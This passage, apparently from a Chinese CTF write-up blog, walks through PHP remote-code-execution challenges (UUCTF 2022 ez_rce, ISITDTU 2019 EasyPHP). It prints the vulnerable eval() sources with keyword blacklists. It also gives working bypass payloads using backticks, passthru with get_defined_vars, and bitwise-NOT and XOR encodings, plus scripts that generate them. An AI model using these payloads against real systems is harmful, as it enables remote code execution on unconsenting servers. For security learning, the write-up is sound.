class="hljs-number">0</span>x34,_0x20110d:<span class="hljs-number">0</span>x58,_0x254af3:<span class="hljs-number">0</span>x42,_0x1a94f1:<span class="hljs-number">0</span>x1e,_0x5ada1f:<span class="hljs-number">0</span>x31,_0x196f40:<span class="hljs-number">0</span>x34,_0x4a8c85:<span class="hljs-number">0</span>x28,_0x47addc:<span class="hljs-number">0</span>x19,_0x30822d:<span class="hljs-number">0</span>x24,_0x3e249d:<span class="hljs-number">0</span>x2e,_0x2b26e0:<span class="hljs-number">0</span>x58,_0x4f3690:<span class="hljs-number">0</span>x47,_0x3c504c:<span class="hljs-number">0</span>x50,_0x1a2215:<span class="hljs-number">0</span>x6f,_0x39fe3a:<span class="hljs-number">0</span>x4a,_0x4fd901:<span class="hljs-number">0</span>x45,_0x10de2d:<span class="hljs-number">0</span>x1f,_0x2a2458:<span class="hljs-number">0</span>x25,_0x58203e:<span class="hljs-number">0</span>x1a&#125;,_0x516e80=&#123;_0x5cb0d8:<span class="hljs-number">0</span>x211&#125;,_0x5d0dad=&#123;_0x1613ab:<span class="hljs-number">0</span>x1ff&#125;,_0x1550b6=&#123;_0x140e00:<span class="hljs-number">0</span>x89,_0x607bd8:<span class="hljs-number">0</span>x75,_0x4b17ac:<span class="hljs-number">0</span>x6c,_0x49bd64:<span class="hljs-number">0</span>x69,_0x3f68a9:<span class="hljs-number">0</span>x139,_0x2ddba9:<span class="hljs-number">0</span>x10b,_0xde357b:<span class="hljs-number">0</span>x129,_0x4cdfc3:<span class="hljs-number">0</span>x127,_0x57e7ef:<span class="hljs-number">0</span>x12e,_0x5880b7:<span class="hljs-number">0</span>x11c&#125;,_0x3192e1=&#123;_0xc8443:<span class="hljs-number">0</span>x1df,_0x46ec9d:<span class="hljs-number">0</span>x6a,_0x28ff76:<span class="hljs-number">0</span>x18&#125;,_0x4a808f=&#123;_0x4b5811:<span class="hljs-number">0</span>xb5,_0x32e532:<span class="hljs-number">0</span>x14a&#125;,_0x5c60d1=&#123;&#x27;hBTTo&#x27;:function(_0x25fb20,_0x12189f)&#123;return _0x25fb20(_0x12189f);&#125;,&#x27;uIXZH&#x27;:function(_0xb7d19a,_0x59fe0a)&#123;return _0xb7d19a+_0x59fe0a;&#125;,&#x27;ImzSF&#x27;:_0x267e4f(-_0x4144aa._0x4f61c6,-_0x4144aa._0x4ec412,-_0x4144aa._0x4466f1,-_0x4144aa._0x59405e)+_0x4a6379(-_0x4144aa._0x5402ec,-_0x4144aa._0x23a7b5,-_0x4144aa._0x39cdb3,-_0x4144aa._0xa27ff5),&#x27;lJzaJ&#x27;:_0x4a6379(-_0x4144aa._0x27781b,-_0x4144aa._0x28ad57,-<span class="hljs-number">0</span>xe,-_0x4144aa._0x42431b)+_0x267e4f(-<span class="hljs-number">0</span>x5a,-_0x4144aa._0x58e6a6,-_0x4144aa._0x1fe380,-<span class="hljs-number">0</span>x2c)+_0x4a6379(-_0x4144aa._0x41c840,-_0x4144aa._0x477930,-<span class="hljs-number">0</span>x5a,-_0x4144aa._0x9c4a22)+&#x27;\x20)&#x27;,&#x27;kEHtY&#x27;:function(_0x2b88a3)&#123;return _0x2b88a3();&#125;,&#x27;fHNYw&#x27;:_0x4a6379(-<span class="hljs-number">0</span>x1b,-_0x4144aa._0x2d9097,-_0x4144aa._0xc7b3a9,-_0x4144aa._0x5d5f63),&#x27;CVRPZ&#x27;:_0x4a6379(-_0x4144aa._0x168a67,-_0x4144aa._0x176432,-<span class="hljs-number">0</span>x28,-_0x4144aa._0x5a4a44),&#x27;yilcq&#x27;:_0x267e4f(-_0x4144aa._0x41ed0d,-_0x4144aa._0x477930,-<span class="hljs-number">0</span>x59,-<span class="hljs-number">0</span>x77),&#x27;wUKnB&#x27;:&#x27;exception&#x27;,&#x27;KihKC&#x27;:&#x27;trace&#x27;,&#x27;iCuce&#x27;:function(_0x15cdbf,_0x284bba)&#123;return _0x15cdbf===_0x284bba;&#125;,&#x27;aVzQL&#x27;:_0x267e4f(-_0x4144aa._0x22ff6f,-_0x4144aa._0x4f793a,-_0x4144aa._0x14c440,-_0x4144aa._0x20e197)&#125;,_0x333977=function()&#123;function _0x5b1501(_0x5f3aa4,_0x2ebac2,_0x3cf02c,_0x21e2be)&#123;return _0x4a6379(_0x5f3aa4-_0x4a808f._0x4b5811,_0x5f3aa4,_0x3cf02c-_0x4a808f._0x32e532,_0x2ebac2- -<span class="hljs-number">0</span>xfc);&#125;var _0x5f3690;function _0xfa6b34(_0x541643,_0x242a5d,_0x3b6829,_0x486be3)&#123;return _0x267e4f(_0x541643-_0x3192e1._0xc8443,_0x242a5d-_0x3192e1._0x46ec9d,_0x242a5d- -_0x3192e1._0x28ff76,_0x486be3);&#125;try&#123;_0x5f3690=_0x5c60d1[&#x27;hBTTo&#x27;](Function,_0x5c60d1[_0xfa6b34(-_0x1550b6._0x140e00,-_0x1550b6._0x607bd8,-_0x1550b6._0x4b17ac,-_0x1550b6._0x49bd64)](_0x5c60d1[_0x5b1501(-_0x1550b6._0x3f68a9,-<span class="hljs-number">0</span>x120,-<span class="hljs-number">0</span>x103,-<span class="hljs-number">0</span>x129)]+(_0x5b1501(-<span class="hljs-number">0</span>x123,-_0x1550b6._0x2ddba9,-<span class="hljs-number">0</span>x107,-<span class="hljs-number">0</span>x10d)+_0x5b1501(-_0x1550b6._0xde357b,-_0x1550b6._0x4cdfc3,-_0x1550b6._0x57e7ef,-_0x1550b6._0x5880b7)+&#x27;rn\x20this\x22)(&#x27;+&#x27;\x20)&#x27;),&#x27;);&#x27;))();&#125;catch(_0xdb4722)&#123;_0x5f3690=window;&#125;return _0x5f3690;&#125;,_0x184b95=_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x5b,-_0x4144aa._0x34dff4,-<span class="hljs-number">0</span>x48,-_0x4144aa._0x59b287)](_0x333977),_0x3692ac=_0x184b95[_0x4a6379(-_0x4144aa._0x507934,-_0x4144aa._0x21b0c8,-_0x4144aa._0x4f8687,-_0x4144aa._0x34dff4)]=_0x184b95[_0x267e4f(-_0x4144aa._0x1f3a88,-<span class="hljs-number">0</span>x74,-_0x4144aa._0x2aba12,-<span class="hljs-number">0</span>x78)]||&#123;&#125;;function _0x4a6379(_0x247b48,_0x32c30d,_0x193949,_0x47b8dc)&#123;return _0x3b1f(_0x47b8dc- -_0x5d0dad._0x1613ab,_0x32c30d);&#125;var _0x5a0618=[_0x5c60d1[_0x267e4f(-_0x4144aa._0x41c840,-_0x4144aa._0x422a11,-_0x4144aa._0x18f7c3,-_0x4144aa._0xff3bc2)],_0x5c60d1[&#x27;CVRPZ&#x27;],_0x5c60d1[&#x27;yilcq&#x27;],&#x27;error&#x27;,_0x5c60d1[&#x27;wUKnB&#x27;],&#x27;table&#x27;,_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x51,-<span class="hljs-number">0</span>x50,-_0x4144aa._0x108211,-<span class="hljs-number">0</span>x2f)]];function _0x267e4f(_0x461525,_0xfee197,_0x3156e7,_0x46e751)&#123;return _0x3b1f(_0x3156e7- -_0x516e80._0x5cb0d8,_0x46e751);&#125;for(var _0x3524db=<span class="hljs-number">0</span>xf*-<span class="hljs-number">0</span>x51+-<span class="hljs-number">0</span>x17db+<span class="hljs-number">0</span>x1c9a;_0x3524db&lt;_0x5a0618[_0x267e4f(-_0x4144aa._0x2caa7a,-_0x4144aa._0x4e740c,-<span class="hljs-number">0</span>x5c,-_0x4144aa._0x18d7cd)];_0x3524db++)&#123;if(_0x5c60d1[_0x267e4f(-_0x4144aa._0x47cc51,-_0x4144aa._0x2a7dfb,-_0x4144aa._0x2289cf,-_0x4144aa._0x5c6a95)](_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x51,-<span class="hljs-number">0</span>x76,-_0x4144aa._0x477930,-_0x4144aa._0x21b0c8)],_0x4a6379(<span class="hljs-number">0</span>x3,_0x4144aa._0x50cdcd,-_0x4144aa._0x51ba5d,-_0x4144aa._0x16a5c4)))&#123;var _0x242bf8;try&#123;_0x242bf8=_0x391b0a(_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x52,-_0x4144aa._0x2710b4,-_0x4144aa._0x20ce72,-_0x4144aa._0x27cb18)]+_0x5c60d1[&#x27;lJzaJ&#x27;]+&#x27;);&#x27;)();&#125;catch(_0x35c4c3)&#123;_0x242bf8=_0x56ea5b;&#125;return _0x242bf8;&#125;else&#123;var _0x51616c=(_0x267e4f(-_0x4144aa._0x2caa7a,-<span class="hljs-number">0</span>x15,-_0x4144aa._0x48b65d,-_0x4144aa._0x37efbc)+&#x27;<span class="hljs-number">3</span>&#x27;)[_0x267e4f(-_0x4144aa._0x5402ec,-_0x4144aa._0x5a5b51,-<span class="hljs-number">0</span>x3f,-_0x4144aa._0x18d7cd)](&#x27;|&#x27;),_0x2f48bc=<span class="hljs-number">0</span>x251*-<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x2436+<span class="hljs-number">0</span>x2687;while(!![])&#123;switch(_0x51616c[_0x2f48bc++])&#123;case&#x27;<span class="hljs-number">0</span>&#x27;:var _0x468a4d=_0x3692ac[_0x14b7da]||_0x58126c;continue;case&#x27;<span class="hljs-number">1</span>&#x27;:var _0x14b7da=_0x5a0618[_0x3524db];continue;case&#x27;<span class="hljs-number">2</span>&#x27;:var _0x58126c=_0x18bc3c[_0x4a6379(-_0x4144aa._0x46aa95,-_0x4144aa._0x1e2298,-_0x4144aa._0x20110d,-_0x4144aa._0x254af3)+&#x27;r&#x27;][_0x4a6379(-_0x4144aa._0x1a94f1,-_0x4144aa._0x5ada1f,-_0x4144aa._0x196f40,-_0x4144aa._0x4a8c85)][_0x267e4f(-<span class="hljs-number">0</span>x47,-_0x4144aa._0x47addc,-_0x4144aa._0xc7b3a9,-<span class="hljs-number">0</span>x28)](_0x18bc3c);continue;case&#x27;<span class="hljs-number">3</span>&#x27;:_0x3692ac[_0x14b7da]=_0x58126c;continue;case&#x27;<span class="hljs-number">4</span>&#x27;:_0x58126c[_0x4a6379(-_0x4144aa._0x5402ec,-_0x4144aa._0x14c440,-_0x4144aa._0x30822d,-_0x4144aa._0x4f793a)]=_0x18bc3c[_0x267e4f(-_0x4144aa._0x4f8687,-_0x4144aa._0x3e249d,-_0x4144aa._0xc7b3a9,-_0x4144aa._0x59405e)](_0x18bc3c);continue;case&#x27;<span class="hljs-number">5</span>&#x27;:_0x58126c[_0x267e4f(-_0x4144aa._0x2b26e0,-_0x4144aa._0x4f3690,-_0x4144aa._0x4e740c,-_0x4144aa._0x3c504c)]=_0x468a4d[_0x267e4f(-_0x4144aa._0x1a2215,-_0x4144aa._0x39fe3a,-_0x4144aa._0x4e740c,-_0x4144aa._0x4fd901)][_0x4a6379(-_0x4144aa._0x10de2d,-_0x4144aa._0x168a67,-_0x4144aa._0x2a2458,-_0x4144aa._0x58203e)](_0x468a4d);continue;&#125;break;&#125;&#125;&#125;&#125;);_0x5a7a9e();<br></code></pre></td></tr></table></figure>
<p>然后再执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">alert</span>(_0x324fcb(<span class="hljs-number">0</span>x2d9,<span class="hljs-number">0</span>x2c3,<span class="hljs-number">0</span>x2db,<span class="hljs-number">0</span>x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(<span class="hljs-number">0</span>x5a1,<span class="hljs-number">0</span>x595,<span class="hljs-number">0</span>x59e,<span class="hljs-number">0</span>x57c)+&#x27;irlfriend&#125;&#x27;)<br></code></pre></td></tr></table></figure>

<p><img src="/images/D6CB2DBB23DC4b458FD2AD853C6C7FDC.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br>## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？<br><span class="hljs-keyword">if</span>(isset($_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">code</span>&#x27;]</span>))&#123;<br>    $code=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">code</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> (!preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">sys</span>|<span class="hljs-params">pas</span>|<span class="hljs-params">read</span>|<span class="hljs-params">file</span>|<span class="hljs-params">ls</span>|<span class="hljs-params">cat</span>|<span class="hljs-params">tac</span>|<span class="hljs-params">head</span>|<span class="hljs-params">tail</span>|<span class="hljs-params">more</span>|<span class="hljs-params">less</span>|<span class="hljs-params">php</span>|<span class="hljs-params">base</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">cp</span>|\$|\<span class="hljs-operator">*</span>|\+|\^|<span class="hljs-params">scan</span>|\.|<span class="hljs-params">local</span>|<span class="hljs-params">current</span>|<span class="hljs-params">chr</span>|<span class="hljs-params">crypt</span>|<span class="hljs-params">show_source</span>|<span class="hljs-params">high</span>|<span class="hljs-params">readgzfile</span>|<span class="hljs-params">dirname</span>|<span class="hljs-params">time</span>|<span class="hljs-params">next</span>|<span class="hljs-params">all</span>|<span class="hljs-params">hex2bin</span>|<span class="hljs-params">im</span>|<span class="hljs-params">shell</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">code</span>)</span>)&#123;<br>        echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;;<br>        eval($code);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;你想干什么？？？？？？？？？&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;<br>    show<span class="hljs-constructor">_source(<span class="hljs-params">__FILE__</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>学到了一些rce的新方法</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">?<span class="hljs-keyword">code</span>=print(<span class="hljs-string">&#x27;l\s&#x27;</span>);<span class="hljs-comment">//反引号  print_r也可以</span><br>?<span class="hljs-keyword">code</span>=var_dump(‘l\s’); <span class="hljs-comment">//都是反引号</span><br>?<span class="hljs-keyword">code</span>=’l\s /|tee a‘;  <span class="hljs-comment">//反引号，然后去a文件看结果</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/6772E1B0EC1549c4ABF74D13DCC94062.png" srcset="/img/loading.gif" lazyload></p>
<p>还有一种是参数逃逸执行任意命令</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-number">1</span>=passthru(<span class="hljs-string">&#x27;l\s /&#x27;</span>);&amp;code=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">pos</span>(<span class="hljs-keyword">pos</span>(get_defined_vars())));<br></code></pre></td></tr></table></figure>
<p><img src="/images/E9557FBEE74B428f9A3C80EAF2AE792C.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>：函数返回当前工作目录。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：函数返回指定目录中的文件和目录的数组。<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>：函数返回路径中的目录部分。<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>：函数改变当前的目录。<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>：输出一个文件。<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>：返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">current</span>() 的别名。<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>：函数将内部指针指向数组中的下一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>：将内部指针指向数组中的最后一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>：函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">array_flip</span>() 函数用于反转/交换数组中所有的键名以及它们关联的键值。<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>：函数在数组中根据条件取出一段值，并返回。<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：函数返回翻转顺序的数组。<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> 函数从指定的：ASCII 值返回字符。<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>：— 转换十六进制字符串为二进制字符串。<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>：获取一个环境变量的值(在<span class="hljs-number">7.1</span>之后可以不给予参数)。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：函数返回一包含本地数字及货币格式信息的数组。<br><span class="hljs-function"><span class="hljs-title">get_defined_vars</span><span class="hljs-params">()</span></span>: 返回由所有已定义变量所组成的数组<br></code></pre></td></tr></table></figure>


<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://regex101.com/">正则匹配在线网站</a><br>用着还不错，虽然是英文的<br>因为正则禁用的字符有点多，所以我们可以用异或或者取反<br>先取反<br><img src="/images/04C366AE5B5F43908D4449A029E965A4.png" srcset="/img/loading.gif" lazyload><br>phpinfo可以通过取反获得<br>可以看到disable_functions禁用了大量系统函数，同时也限制了open_basedir在&#x2F;var&#x2F;www&#x2F;html，下一步是找flag文件，我们可以用scandir()或者glob()函数列目录，但它返回一个数组，我们还需要一个print_r或var_dump<br>所以我们需要的式子为print_r(scandir(.))<br>再用取反执行一句话木马或者命令语句会因为第二个if而无法执行，取反这时是没有办法绕过的</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if ( <span class="hljs-name">strlen</span>(<span class="hljs-name">count_chars</span>(<span class="hljs-name">strtolower</span>($_), <span class="hljs-number">0</span>x3)) &gt; <span class="hljs-number">0</span>xd )<br>    die(&#x27;you are so close, omg&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>这个if的意思是输入的字符串不能超过13种字符，就是要不同的13种字符，重复的不算入新的字符</p>
<p>这时就需要异或来绕过了</p>
<p>异或绕过脚本</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;?php<br><br>#用不可见字符异或<br>$l = <span class="hljs-string">&quot;&quot;</span>;<br>$r = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">//$argv = str_split(&quot;_GET&quot;);</span><br>$argv = str_split(<span class="hljs-string">&quot;phpinfo&quot;</span>);<br><span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;count($argv);$i++)<br>&#123;<br>    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;<span class="hljs-number">255</span>;$j++)<br>    &#123;<br>        $k = chr($j)^chr(<span class="hljs-number">255</span>);<br>        <span class="hljs-keyword">if</span>($k == $argv[$i])&#123;<br>            <span class="hljs-keyword">if</span>($j&lt;<span class="hljs-number">16</span>)&#123;<br>                $l .= <span class="hljs-string">&quot;%ff&quot;</span>;<br>                $r .= <span class="hljs-string">&quot;%0&quot;</span> . dechex($j);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            $l .= <span class="hljs-string">&quot;%ff&quot;</span>;<br>            $r .= <span class="hljs-string">&quot;%&quot;</span> . dechex($j);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>echo <span class="hljs-string">&quot;(&quot;</span>.$l.<span class="hljs-string">&quot;^&quot;</span>.$r.<span class="hljs-string">&quot;)&quot;</span>;<br>#&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;       =_GET<br>#?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>获得的异或式子print_r(scandir(.))</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>d))(((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>发现还是没有通过第二个if，且用了16个不同字符，下一步需要缩减字符数<br><img src="/images/C19D81C0EE214c5dBEA86E2EFBA4AD04.png" srcset="/img/loading.gif" lazyload><br>除去必要字符外()^;我们还有12个不同字符，%ff很重要所以不能去掉，先不包含它，所以我们现在有11个不同字符，需要再去掉3个，8+%ff(必要)+4(必要字符) &#x3D; 13  刚刚好<br>现在我们要做的是在这11个字符种去掉3个，然后再让它们之间相互异或，以得到去掉的那3个字符的值(那三个值随意)</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">result2 = [<span class="hljs-number">0x8b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x8c</span>]  #除去必要字符的<span class="hljs-number">11</span>个不同字符<br>result = [<span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8c</span>]  # 去掉<span class="hljs-number">3</span>个字符后的不同字符,这里我们把ntr去掉了<br>temp = []<br>for d <span class="hljs-keyword">in</span> result2:<br>    for a <span class="hljs-keyword">in</span> result:<br>        for b <span class="hljs-keyword">in</span> result:<br>            for c <span class="hljs-keyword">in</span> result:<br>                if (a ^ b ^ c == d):<br>                    if a == b == c == d:<br>                        continue<br><span class="hljs-symbol">                    else:</span><br>                        print(<span class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        if d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp<span class="hljs-number">.</span>append(d)<br>print(len(temp), temp)<br></code></pre></td></tr></table></figure>

<p>print_r源式子</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%8</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>d)<br></code></pre></td></tr></table></figure>

<p>缩减后的</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>

